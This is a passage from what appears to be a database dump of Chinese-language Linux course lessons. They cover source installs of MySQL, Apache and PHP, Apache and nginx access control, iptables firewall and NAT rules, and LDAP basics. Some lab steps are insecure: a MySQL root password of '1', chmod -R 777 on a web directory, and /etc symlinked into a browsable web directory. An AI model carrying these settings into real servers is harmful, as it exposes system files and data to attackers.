mysql-5.1.34.tar.gz -C /usr/local/src/<br>cd /usr/local/src/mysql-5.1.34/<br></span><br>如果不存在mysql 用户,则建立mysql用户<br><br><span>useradd mysql<br>passwd mysql<br></span><br><span>./configure --with-mysqld-user=mysql --prefix=/usr/local/mysql --with-extra-charsets=all --exec-prefix=/usr/local/mysql --with-client-ldflags=-all-static --with-mysqld-ldflags=-all-static --with-innodb --with-plugins=partition</span><br><br><span>注解：</span><br>--with-mysqld-user=mysql	以 mysql 用户的身份运行 mysqld 进程<br>--with-extra-charsets=all	支持所有字符集<br>--exec-prefix=/usr/local/mysql	mysql的执行文件安装位置，会在 mysql 目录下产生 bin 目录<br>--with-client-ldflags=-all-static --with-mysqld-ldflags=-all-static	静态编译 mysql，理论上提高性能 13%<br>--with-innodb	支持 innodb 存储引擎<br>--with-plugins=partition	支持分区<br><br><span>make &amp;&amp; make install</span><br><br>=============================================================================================<br><br><span>数据库的初始化</span><br><br><span>cd /usr/local/mysql/bin<br>./mysql_install_db</span><span>&nbsp;</span><span>#此命令是初始化脚本，为Mysql运行做准备：来创建MySQL许可表。此命令执行成功<br>时会在/usr/local/mysql目录下生成var目录，如果执行失败则有可能mysql用户没有<br>创建，需要手工创建：useradd mysql，再把系统的mysql卸载：rpm -e mysql。</span><br><br><span>chown -R mysql:mysql /usr/local/mysql/<br>cd /usr/local/mysql/bin/</span><br><span>./mysqld_safe --user=mysql</span><span>&nbsp;</span>#启动mysql服务器.这时可用ps -e 命令看到mysql 的进程<br><br>===============================================================================================<br><br><span>为mysql数据库添加密码</span><br><br>缺省情况下mysql 已经存在一个root 用户,密码为空<br><span>/usr/local/mysql/bin/mysqladmin password 1</span><span><br></span><br><span>/usr/local/mysql/bin/mysql -u root -p1<span>&nbsp;</span></span>#登录数据库，exit 退出<br><br>===============================================================================================<br><br><span>清除密码（会清空数据库）步骤</span><br><br><span>1.停止服务（pkill）<br>2.删掉/usr/local/mysql/var/<br>3.重新初始化mysql /usr/local/mysql/bin/mysql_install_db<span>&nbsp;</span><br>4.修改拥有者所属组	chown mysql:mysql /usr/local/mysql/var<br>5.启动服务 /usr/local/mysql/bin/mysql --user=mysql &amp;<br>6.测试登录 /usr/local/mysql/bin/mysql<br></span><br>================================================================================================<br><br><span>mysql启动不成功检测<br></span><br><span>1.进程是否已存在<span>&nbsp;</span></span><br>pkill mysql　重新启动mysql<br><span>2. 端口是否被占用(rpm安装mysql 是否在启动中)</span><br>service mysqld stop<br>netstat -anltp | grep :3306<br><span>3.查看/usr/local/mysql/拥有者所属组是否为mysql</span><br>重点查看/usr/local/mysql/var下所有文件拥有者和所属组权限<br><span>4./tmp目录权限是否为1777</span><br><span>5.查看日志/usr/local/mysql/var/主机名.err</span><br><br>================================================================================================<br><br><span>将源码mysql改成sys V 方式启动</span><br><br><span>cp /usr/local/mysql/share/mysql/mysql.server /etc/init.d/mysqldd<br>chkconfig --add mysqldd<br>chkconfig --list mysqldd<br>chkconfig --levels 35 mysqldd on<br>service mysqldd restart</span><br><br>=================================================================================================<br><br><span>把源码包使用的命令加入到系统全局环境变量中<br></span><br><span>vim /etc/bashrc<br>export PATH=/usr/local/mysql/bin/:$PATH<br>source /etc/bashrc<br></span><br><span style=\"font-weight: 700;\">Apache的源码包安装</span><br></dd><dd><span>apache源码包安装<br></span><br><span>tar xf httpd-2.2.11.tar.bz2<br>cd /usr/local/src/httpd-2.2.11/<br>./configure --prefix=/usr/local/apache2 --enable-so --enable-rewrite<span>&nbsp;</span><br></span><br>注解：<br>--enable-so	让apache核心装载DSO<br><br><span>make &amp;&amp; make install</span></dd><dt>Php的源码包安装</dt><dd><span>编译安装php</span><br><br><span>tar xf php-5.2.9.tar.bz2 -C /usr/local/src<br>cd /usr/local/src/php-5.2.9<br>./configure --prefix=/usr/local/php --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-config-file-path=/usr/local/php<br></span><br><span>注解：</span><br>--with-apxs2=/usr/local/apache2/bin/apxs	用apache的apxs工具把php编译成apache的一个模块<br>--with-mysql=/usr/local/mysql	与mysql结合<br><br><span>make &amp;&amp; make install</span><br><br><span>cp php.ini-dist /usr/local/php/php.ini<span>&nbsp;</span></span><br><br>如果一切顺利的话，apache2/modules 下应该有个libphp5.so 的文件<br><br>======================================================================<br><span><br>为apache 添加php 支持</span><br><br><span>vim /usr/local/apache2/conf/httpd.conf<br></span><br>增加一行<br><span>AddType application/x-httpd-php .php</span><br>在DirectoryIndex指令的最后,添加<br><span>index.php</span><br><br>======================================================================<br><br><span>重启apache测试Apache及php支持</span><br>/usr/local/apache2/bin/apachectl stop<span>&nbsp;</span><br>/usr/local/apache2/bin/apachectl start<br><br>=======================================================================<br><br><span>自行完成一个php 测试页index.php, 包含一行:</span><br>vim /usr/local/apache2/htdocs/index.php<br>&lt;? phpinfo() ?&gt; ,放在DocumentRoot下<br><br><br><span style=\"font-weight: 700;\">导入数据</span><br></dd><dd><span>unzip farm-ucenter1.5.zip<br>mv upload /usr/local/apache2/htdocs/sns<br>cd /usr/local/apache2/htdocs/</span><br><span>chmod -R 777 sns<br>firefox http://192.168.0.164:/sns<br></span><br>在页面创建数据库名字为myfarm<br><br><span>cd /usr/local/apache2/htdocs/sns<br>mysql -u root -p1 myfarm &lt; qqfarm.sql</span></dd></dl></dd><dt>访问控制</dt><dd><span>访问控制<br><br></span>=================================================================================<span><br></span><br><span>启动目录索引特性和支持符号链接<br></span><br><span>ln -s /etc /var/www/tianyun/download/etc</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/httpd/conf/httpd.conf</span><br><br><span>&lt;Directory \"/var/www/tianyun/download\"&gt;<br>Options Indexes FollowSymLinks	//启动目录索引特性和支持符号链接<br>&lt;/Directory&gt;</span><br><br>================================================================================<br><br><span>基于用户的访问控制</span><br><br><span>1. 建立口令文件</span><br>[root@station02 ~]#<span>&nbsp;</span><span>htpasswd -cm /etc/httpd/.passwd user1</span><br>New password:<span>&nbsp;</span><br>Re-type new password:<span>&nbsp;</span><br>Adding password for user user1<br><br>[root@station02 ~]#<span>&nbsp;</span><span>cat /etc/httpd/.passwd<span>&nbsp;</span></span><br>user1:$apr1$PF8nZ...$dYG0gIGb7LgD0csX8FvEx.<br><br>[root@station02 ~]#<span>&nbsp;</span><span>htpasswd -m /etc/httpd/.passwd user2</span><br>New password:<span>&nbsp;</span><br>Re-type new password:<span>&nbsp;</span><br>Adding password for user user2<br><br>[root@station02 ~]#<span>&nbsp;</span><span>cat /etc/httpd/.passwd<span>&nbsp;</span></span><br>user1:$apr1$PF8nZ...$dYG0gIGb7LgD0csX8FvEx.<br>user2:$apr1$oEJTn...$yUjgGfif.pRVq/hpT8wzs/<br><br><span>2. 配置文件</span><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/httpd/conf/httpd.conf<br></span><br><span>&lt;Directory \"/var/www/tianyun/download\"&gt;<br>Options Indexes<br>AuthType basic<br>AuthName \"welcome to tianyun.com/download.\"<br>AuthUserFile /etc/httpd/.passwd<br>Require valid-user<br>&lt;/Directory&gt;</span><br><br>====================================================================================<br><br><span>基于主机的访问控制</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/httpd/conf/httpd.conf<br></span><br><span>&lt;Directory \"/var/www/tianyun/download\"&gt;<br>Order allow,deny<br>Allow from all<br>&lt;/Directory&gt;<br><br>&lt;Directory \"/var/www/tianyun/download\"&gt;<br>Order deny,allow<br>Allow from all<br>&lt;/Directory&gt;<br><br>&lt;Directory \"/var/www/tianyun/download\"&gt;<br>Order allow,deny<br>Allow from 192.168.0.0/24<br>Deny from all<br>&lt;/Directory&gt;<br><br>&lt;Directory \"/var/www/tianyun/download\"&gt;<br>Order deny,allow<br>Allow from 192.168.0.0/24<br>Allow from 192.168.1.0/24<br>Deny from all<br>&lt;/Directory&gt;</span><br><br>====================================================================================<br><br><span>别名功能Alias</span><br><br><span>Alias /icons/ \"/var/www/icons/\"	<br>别名 真正路径</span><br><br>[root@station02 download]#<span>&nbsp;</span><span>mkdir /aaa</span><br>[root@station02 download]#<span>&nbsp;</span><span>echo \"1111\" &gt; /aaa/index.html</span><br>[root@station02 download]#<span>&nbsp;</span><span>vim /etc/httpd/conf/httpd.conf<br></span><br><span>Alias /yang \"/aaa\"<br>&lt;Directory \"/aaa\"&gt;<br>Order allow,deny<br>Deny from all<br>&lt;/Directory&gt;</span><br><br><span>http://www.tianyun.com/yang/</span>	</dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:25:06',1,NULL,'',0,''),(77,'linux基础课程训练十六','nginx方面的操作','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><p>Nginx<br><br>高性能HTTP，反向代理<br><br>========================================================================================================<br><br>基本安装<br><br>pcre<br>支持正则表达式，地址重写rewrite<br>[root@station02 ~]#&nbsp;tar xvf pcre-8.10.tar.gz<br>[root@station02 pcre-8.10]#&nbsp;./configure &amp;&amp; make &amp;&amp; make install<br>[root@station02 pcre-8.10]#&nbsp;echo $?<br>0<br><br>nginx<br>[root@station02 ~]#&nbsp;useradd www<br>[root@station02 nginx-1.2.0]#&nbsp;./configure --user=www --group=www --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module<br>[root@station02 nginx-1.2.0]#&nbsp;make &amp;&amp; make install<br><br>[root@station02 ~]#&nbsp;tree /usr/local/nginx/<br>/usr/local/nginx/<br>|-- conf<br>| |-- fastcgi.conf<br>| |-- fastcgi.conf.default<br>| |-- fastcgi_params<br>| |-- fastcgi_params.default<br>| |-- koi-utf<br>| |-- koi-win<br>| |-- mime.types<br>| |-- mime.types.default<br>| |-- nginx.conf<br>| |-- nginx.conf.default<br>| |-- scgi_params<br>| |-- scgi_params.default<br>| |-- uwsgi_params<br>| |-- uwsgi_params.default<br>| `-- win-utf<br>|-- html<br>| |-- 50x.html<br>| `-- index.html<br>|-- logs<br>`-- sbin<br>`-- nginx<br><br>4 directories, 18 files<br><br>========================================================================================================<br><br>启动nginx<br><br>[root@station02 ~]#&nbsp;/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf<br>[root@station02 ~]#&nbsp;ps -ef | grep nginx<br><br>root 13888 1 0 19:26 ? 00:00:00 nginx: master process /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf<br>www 13889 13888 0 19:26 ? 00:00:00 nginx: worker process&nbsp;<br><br>[root@station02 ~]#&nbsp;netstat -tnlp |grep :80<br>tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 13888/nginx&nbsp;<br><br>[root@station02 ~]#&nbsp;echo \"/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf\" &gt;&gt; /etc/rc.local&nbsp;<br><br>[root@station40 ~]#&nbsp;links --dump http://192.168.0.2<br>Welcome to nginx!<br><br>===========================================================================================================<br><br>配置Nginx<br><br>[root@station02 ~]#&nbsp;vim /usr/local/nginx/conf/nginx.conf<br><br>worker_processes 5;	初始启动的进程数<br>worker_connections 1024;	最大的连接数<br><br>==========================================================================================================<br><br>语法检查<br><br>[root@station02 ~]#&nbsp;/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf<br><br>nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok<br>nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful<br><br>===========================================================================================================<br><br>重启nginx<br><br>[root@station02 ~]#&nbsp;pgrep nginx<br>13888<br>13889<br>[root@station02 ~]#&nbsp;kill 13888<br>[root@station02 ~]#&nbsp;/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf<br><br><br></p><dl><dt>虚拟主机</dt><dd><span>虚拟主机</span><br><br><span>基于主机名<br>基于IP<br>基于端口</span><br><br>==================================================================================<br><br><span>基于主机名<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>ping www.tianyun.com ===&gt;192.168.0.2</span><br>[root@station40 ~]#<span>&nbsp;</span><span>ping www.uplooking.com ===&gt;192.168.0.2</span><br><br>[root@station02 html]#<span>&nbsp;</span><span>mkdir -p /www/{tianyun,uplooking}</span><br>[root@station02 html]#<span>&nbsp;</span><span>echo \"www.tianyun.com\" &gt; /www/tianyun/index.html</span><br>[root@station02 html]#<span>&nbsp;</span><span>echo \"www.uplooking.com\" &gt; /www/uplooking/index.html</span><br><br>[root@station02 html]#<span>&nbsp;</span><span>vim /usr/local/nginx/conf/nginx.conf<br></span><br><span>server {<br>listen 80;<br>server_name www.tianyun.com;<br>location / {<br>root /www/tianyun;<span>&nbsp;</span><br>index index.html index.php;<br>}<br>}<br><br>server {<br>listen 80;<br>server_name www.uplooking.com;<br>location / {<br>root /www/uplooking;<br>index index.html index.php;<br>}<br>}</span><br><br>====================================================================================<br><br><span>基于IP<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>ping www.tianyun.com ===&gt;192.168.0.2</span><br>[root@station40 ~]#<span>&nbsp;</span><span>ping www.uplooking.com ===&gt;192.168.0.3</span><br><br>[root@station02 html]#<span>&nbsp;</span><span>mkdir -p /www/{tianyun,uplooking}</span><br>[root@station02 html]#<span>&nbsp;</span><span>echo \"www.tianyun.com\" &gt; /www/tianyun/index.html</span><br>[root@station02 html]#<span>&nbsp;</span><span>echo \"www.uplooking.com\" &gt; /www/uplooking/index.html</span><br><br>[root@station02 html]#<span>&nbsp;</span><span>vim /usr/local/nginx/conf/nginx.conf<br></span><br><span>server {<br>listen 192.168.0.2:80;<br>server_name www.tianyun.com;<br>location / {<br>root /www/tianyun;<span>&nbsp;</span><br>index index.html index.php;<br>}<br>}<br><br>server {<br>listen 192.168.0.3:80;<br>server_name www.uplooking.com;<br>location / {<br>root /www/uplooking;<br>index index.html index.php;<br>}<br>}</span><br><br></dd><dt>基于用户的访问控制</dt><dd><span>基于用户的访问控制<br><br>=====================================================================================<br></span><br><span>1. 建立口令文件<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>htpasswd -cm /usr/local/nginx/passwd user10</span><br>New password:<span>&nbsp;</span><br>Re-type new password:<span>&nbsp;</span><br>Adding password for user user10<br><br>[root@station02 ~]#<span>&nbsp;</span><span>htpasswd -m /usr/local/nginx/passwd user20</span><br>New password:<span>&nbsp;</span><br>Re-type new password:<span>&nbsp;</span><br>Adding password for user user20<span>&nbsp;</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>cat /usr/local/nginx/passwd<span>&nbsp;</span></span><br>user10:$apr1$taZyM...$wf52nn3/kf0L4yo4KT7Of1<br>user20:$apr1$W3QXX/..$dhn7y.PvCw/V3wmFzlhdh/<br><br>=====================================================================================<br><br><span>2.配置文件</span><span><span>&nbsp;</span><br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /usr/local/nginx/conf/nginx.conf<br></span><br><span>server {<br>listen 80;<br>server_name www.uplooking.com;<br>location / {<br>root /www/uplooking;<br>index index.html index.php;<br>auth_basic \"test...\";<br>auth_basic_user_file /usr/local/nginx/passwd;<br>}<br>}<br></span><br>========================================================================================<br><br><span>3. 重启nginx<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf<span>&nbsp;</span></span>语法检查<br>[root@station02 ~]#<span>&nbsp;</span><span>pgrep nginx</span><br>[root@station02 ~]#<span>&nbsp;</span><span>kill -1 13888</span><br>[root@station02 ~]#<span>&nbsp;</span><span>/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span></dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:26:40',1,NULL,'',0,''),(78,'linux基础课程训练十七','网络安全方面的linux常用操作','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><p>网络安全(针对网络服务)<br><br>安全体系概览：<br>Firewalls<br>TCP Wrappers<br>Xinetd<br>PAM<br>SELinux<br>Service<br>specific<br><br>常见协议对应端口 /etc/services<br><br>[root@station02 ~]#&nbsp;grep \'^snmp\' /etc/services<br><br>snmp 161/tcp # Simple Net Mgmt Proto<br>snmp 161/udp # Simple Net Mgmt Proto<br>snmptrap 162/udp snmp-trap # Traps for SNMP<br>snmp-tcp-port 1993/tcp # cisco SNMP TCP port<br>snmp-tcp-port 1993/udp # cisco SNMP TCP port<br><br>[root@station02 ~]#&nbsp;grep \'^domain\' /etc/services<br><br>domain 53/tcp # name-domain server<br>domain 53/udp<br>domaintime 9909/tcp # domaintime<br>domaintime 9909/udp # domaintime<br><br><span style=\"font-weight: 700; line-height: 1;\">TCP wrappers</span><br></p><dl><dd><span>TCP Wrappers<br></span><br>[root@station11 ~]#<span>&nbsp;</span><span>which sshd</span><br>/usr/sbin/sshd<br><br>[root@station11 ~]#<span>&nbsp;</span><span>ldd /usr/sbin/sshd | grep libwrap</span><br>libwrap.so.0 =&gt; /lib/libwrap.so.0 (0x003fa000)<br><br>[root@station40 ~]#<span>&nbsp;</span><span>which vsftpd</span><br>/usr/sbin/vsftpd<br>[root@station40 ~]#<span>&nbsp;</span><span>ldd /usr/sbin/vsftpd |grep libwrap</span><br>libwrap.so.0 =&gt; /lib/libwrap.so.0 (0x003f4000)<br><br><span>ls /etc/hosts.*</span><br>hosts.allow hosts.deny<span>&nbsp;</span><br><br><span>示例：仅允许192.168.0.0/255.255.255.0访问sshd</span><br>[root@station11 ~]#<span>&nbsp;</span><span>cat /etc/hosts.deny<span>&nbsp;</span></span><br>sshd: ALL<br>[root@station11 ~]#<span>&nbsp;</span><span>cat /etc/hosts.allow<span>&nbsp;</span></span><br>sshd: 192.168.0.0/255.255.255.0<br></dd><dt>iptables</dt><dd><span>Iptables</span><span><br></span><br><span>netfilter组件称为内核空间（kernel space），是内核的一部分<br>iptables组件，称为用户空间(user space)，使用它插入、修改、删除规则<br></span><br><span>netfilter/iptables<br>/etc/sysconfig/iptables<br>/etc/sysconfig/iptables-config<br></span><br><span>语法:<span>&nbsp;</span></span><br>iptables [-t 要操作的表] &lt;操作命令&gt; [要操作的链] [规则号码] [匹配条件] [-j 匹配到以后的动作]<br>小写 大写 大写 小写 大写<br><span>示例：</span><br>iptables -L	//&lt;操作命令&gt; -L 查看<br>iptables -t filter -L	//查看filter表中所有链的规则<br>iptables -t filter -L INPUT //查看filter表中INPUT链的规则<br>iptables -t nat -L<br><br><span>注意规则的顺序问题：</span><br>==========================================================<br>iptables -A INPUT -j REJECT<br>iptables -A INPUT -s 192.168.0.0/24 -j ACCEPT 错误<br>==========================================================<br><br>==========================================================<br>iptables -A INPUT -s 192.168.0.0/24 -j ACCEPT 正确<br>iptables -A INPUT -j REJECT<br>==========================================================<br>[root@station40 ~]#<span>&nbsp;</span><span>iptables -N NEWCHAIN</span><span>&nbsp;</span>//filter中新建链<br>[root@station40 ~]#<span>&nbsp;</span><span>iptables -A NEWCHAIN -j REJECT</span><br>[root@station40 ~]#<span>&nbsp;</span><span>iptables -F</span><span>&nbsp;</span>//清空filter表中所有链的规则<br>[root@station40 ~]#<span>&nbsp;</span><span>iptables -X</span><span>&nbsp;</span>//删除filter表中所有自定义链（链必须是空）<br><br><br><dl><dt>iptables实例应用</dt><dd><br>=========================================================================================<br><br><span>公司内部和公司外部都只能访问sshd,httpd,dns,ftp...<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -F</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -X</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -i lo -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><span>&nbsp;</span>//ssh服务<br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><span>&nbsp;</span>//web服务<br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 53 -j ACCEPT</span><span>&nbsp;</span>//DNS<br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p udp --dport 53 -j ACCEPT</span><span>&nbsp;</span>//DNS<br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><span>&nbsp;</span>//ftp的控制端口<br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -j REJECT</span><span>&nbsp;</span>//除了上面的以外，全部拒绝<br><br>[root@station02 ~]#<span>&nbsp;</span><span>modprobe ip_conntrack_ftp</span><span>&nbsp;</span>//加载连接追踪模块（临时）<br>[root@station02 ~]#<span>&nbsp;</span><span>lsmod |grep ftp</span><br>ip_conntrack_ftp 11569 0<span>&nbsp;</span><br>ip_conntrack 53409 4 ip_conntrack_ftp,xt_state,iptable_nat,ip_nat<br><br>[root@station40 ~]#<span>&nbsp;</span><span>vim /etc/sysconfig/iptables-config</span><span>&nbsp;</span>//永久加载模块<br><span>IPTABLES_MODULES=\"ip_conntrack_netbios_ns ip_conntrack_ftp\"</span><span>&nbsp;</span><br><br>===========================================================================================<br><br><span>1. 公司内部可以访问sshd,httpd,mail,samba,ftp等任何服务<br>2. 公司以外的只能访问sshd,httpd,mail<br></span><br><span>常识：文件服务器FTP/Samba/NFS一般是不会对外,如有员工出差需要访问内网文件服务器，可以搭建VPN来访问内网。<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -F</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -X</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -i lo -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -s 192.168.0.0/24 -j ACCEPT</span><span>&nbsp;</span>//公司内部<br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 25 -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -p tcp --dport 110 -j ACCEPT</span><br>[root@station02 ~]#<span>&nbsp;</span><span>iptables -A INPUT -j REJECT</span><br><br><br>[root@station02 ~]#<span>&nbsp;</span><span>service iptables save</span><br>将当前规则保存到 /etc/sysconfig/iptables： [确定]<br>[root@station02 ~]# chkconfig iptables on<br><br></dd></dl></dd><dt>OSI七层模型</dt><dd><span>OSI七层模型</span><br><br><span>应用层<br>表示层<br>会话层<br>传输层 sport:2222 dport:80 tcp<br>网络层 sip:192.168.0.10 dip:1.1.1.1<br>数据链路层 smac:bc:ae:c5:ce:21:ca dmac:bc:ae:c5:ce:21:c2<br>物理层</span><br><br><span>上三层：应用层，操作系统功能<br>下四层：数据流层</span><br><br></dd><dt>NAT</dt><dd><span>NAT</span><br><br><span>网络地址转换(NAT,Network Address Translation)属接入广域网(WAN)技术，是一种将私有（保<br>留）地址转化为合法IP地址的转换技术，它被广泛应用于各种类型Internet 接入方式和各种类型的<br>网络中。原因很简单，NAT不仅完美地解决了IP地址不足的问题，而且还能够有效地避免来自网络外部<br>的攻击，隐藏并保护网络内部的计算机。</span><br><br><br><br><br><br><dl><dt>透明转发</dt><dd><span>透明转发</span><br><br>Client&lt;---------------&gt; NAT Server &lt;---------------&gt; WEB Server<br>192.168.1.1 192.168.1.2-----1.1.1.1 1.1.1.2<br>网关指向192.168.1.2 开启转发功能 网关指向1.1.1.1<br><br>Clinet:<span>&nbsp;</span><br><span>route add default gw 192.168.1.254 dev eth0</span><br><br>NAT Server:<span>&nbsp;</span><br><span>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><br>WEB Server:<span>&nbsp;</span><br><span>route add default gw 1.1.1.1 dev eth0</span><br><br><br><br></dd><dt>SNAT</dt><dd><span>SNAT</span><br><br><span>多应用于公司内网主机上网，公司内部只有一台NAT服务器有公网IP，将网关指向NAT并且目标地址是公网其他服务器的主机<br>发来的包在POSTROUTING处将原地址改为NAT服务器的IP</span><br><br>===============================================================================<br><br><span>有固定IP的NAT服务器<br></span><br>Client&lt;-----------------------&gt; NAT Server &lt;-----------------------&gt; WEB Server<br>192.168.1.1 eth0:192.168.1.254 eth1:1.1.1.1 1.1.1.2<br>网关指向192.168.0.254 开启转发功能	<br><br>Clinet:<span>&nbsp;</span><br><span>route add default gw 192.168.1.254 dev eth0</span><br><br>NAT Server:<span>&nbsp;</span><br><span>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><br>NAT Server:<span>&nbsp;</span><span><br></span>iptables -t nat -A POSTROUTING -p tcp --dport 80 -j SNAT --to-source 1.1.1.1<br><br>================================================================================<br><span><br></span><span>无固定IP（拨号上网）的NAT服务器</span><br><br><span>当公司用NAT是拨号上网的情况，用命令adsl-setup进行拨号，拨号后NAT服务器从运营商 DHCP获得公<br>网动态IP，对内网主机数据包源地址进行转换</span><br><br>NAT Server:<span>&nbsp;</span><br><span>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<br><br></span>==================================================================================<span><br></span></dd><dt>DNAT</dt><dd><span>DNAT</span><br><br><span>DNAT 发布内网的一台服务器<br></span><br>WEB Server&lt;------------&gt; NAT Server &lt;----------------&gt; Client<br>192.168.1.1 eth0:192.168.1.254 eth1:1.1.1.1 1.1.1.2<br>网关指向192.168.0.254 开启转发功能<br><br>WEB Server:<span>&nbsp;</span><br><span>route add default gw 192.168.1.254 dev eth0</span><br><br>NAT Server:<span>&nbsp;</span><br><span>iptables -t nat -A PREROUTING -d 1.1.1.1 -p tcp --dport 80 -j DNAT --to-des 192.168.1.1:80</span><br><br>=======================================================================================================<br><br><span>iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 3128</span><span>&nbsp;</span>squid作透明代理时端口地址重定向<br><br>========================================================================================================</dd></dl></dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:28:35',1,NULL,'',0,''),(79,'linux基础课程训练十八','LDAP方面的基础操作','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><dt>LDAP概念</dt><dd>LDAP<br><br>Lightweight Directory Access Protocol	轻量级目录访问协议<br><br>概念：<br>1. Directory Services 目录服务<br>它是一个特殊的数据库，它存储的是一些小的信息块<br><br>常见的目录服务：<br>电话本: 电话号码 人名<br>DNS： 主机名 IP<br>NIS： 用户名 密码...<br>LDAP： 用户联系信息: 国家 省 街道 邮编 邮件 电话...<br>账户信息：username passwd home uid gid<br>AD:	windows<br><br>目录服务LDAP,AD:&nbsp;写少，读频繁（一次写入，多次读取），优化读<br>关系型数据库： mysql,oracle,db2,sql server 写和读都是频繁&nbsp;<br><br>2. X.500 Directory Service<br>DAP: 目录访问协议<br>LDAP: 轻量级目录访问协议<br><br>=========================================================================<br><br>LDAP是Light weight directory access protocol的缩写，其前身是更为古老的&nbsp;<br>DAP协议。它是基于X.500 标准的，但是它支持 TCP/IP。<br><br>X.500是一个将局部目录服务连接起来，构成全球分布式的目录服务系统的协议。一个X.500<br>系统象一个分门别类的图书馆。而某一机构建立和维护的目录数据库只是全球目录数据库的一部分<br><br>X.500是用来查询有关人员信息（如邮政地址，电话号码，电子邮件地址）的一种服务，提供<br>字段的检索功能，可检索的字段有姓名，人员所在部分名，机构名及国家名等。<br><br>X.500 由于实施太过复杂而受到批评。密歇根州大学推出了一种较为简单的基于 TCP/IP<br>的DAP 新版本，即 LDAP，主要用于因特网。<br><br>LDAP 对数据的读取做了很多优化，比如优化了数据类型，修改了锁机制，取消了不必要的函<br>数，取消了回滚机制等等，非常适用于读多写少的环境。 如果你有一些面向查询的服务，那LDAP<br>无疑是一个不错的选择。<br><br>LDAP 协议是跨平台的和标准的协议，得到了业界的广泛认可。产商都很愿意在产品中加入对<br>LDAP的支持，因为他们根本不用考虑另一端（客户端或服务端）是怎么样的。<br><br>LDAP 允许你根据需要使用ACI（一般都称为ACL或者访问控制列表）控制对数据读和写的权<br>限。ACI可以根据谁访问数据、访问什么数据、数据存在什么地方以及其它对数据进行访问控制。<br>这些都是由 LDAP目录服务器完成，非常的安全。<br><br>================================================================================<br><br>在使用 LDAP存储你的数据前，你应该先问以下几个问题<br>1 